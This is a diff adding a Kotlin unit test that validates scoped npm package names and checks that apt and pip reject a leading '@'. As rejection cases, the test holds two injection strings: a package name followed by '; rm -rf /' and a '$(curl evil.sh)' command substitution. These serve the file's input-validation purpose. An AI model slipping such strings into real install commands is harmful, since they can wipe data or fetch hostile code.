@@ -190,6 +190,26 @@ class SoftwareCatalogTest {
     }
 
     @Test
+    fun `npm scoped packages are accepted for npm only — issue 20`() {
+        // scoped names are valid npm packages
+        val scoped = CustomTools.buildEntry("ni", "npm", "@antfu/ni", "ni", null) {}
+        assertNotNull(scoped)
+        assertEquals("@antfu/ni", (scoped!!.specs.first() as InstallSpec.Npm).pkg)
+        // scope without an explicit binary is allowed; the package name itself is kept as verify target
+        val noBinary = CustomTools.buildEntry("types", "npm", "@types/node", null, null) {}
+        assertNotNull(noBinary)
+        // metacharacters are still rejected inside scoped names
+        assertNull(CustomTools.buildEntry("evil", "npm", "@scope/pkg; rm -rf /", null, null) {})
+        assertNull(CustomTools.buildEntry("evil", "npm", "\$(curl evil.sh)", null, null) {})
+        // apt and pip reject a leading '@' up front
+        assertNull(CustomTools.buildEntry("x", "apt", "@weird", null, null) {})
+        assertNull(CustomTools.buildEntry("x", "pip", "@weird", null, null) {})
+        assertTrue(CustomTools.isAllowedPackage(Ecosystems.NPM, "@a/b"))
+        assertFalse(CustomTools.isAllowedPackage(Ecosystems.APT, "@a/b"))
+        assertFalse(CustomTools.isAllowedPackage(Ecosystems.PIP, "@a/b"))
+    }
+
+    @Test
     fun `custom tools json roundtrip preserves entries`() {
         val e1 = CustomTools.buildEntry("tool-one", "pip", "yt-dlp", null, "Video downloader") {}!!
         val e2 = CustomTools.buildEntry("tool-two", "npm", "typescript", "tsc", null) {}!!
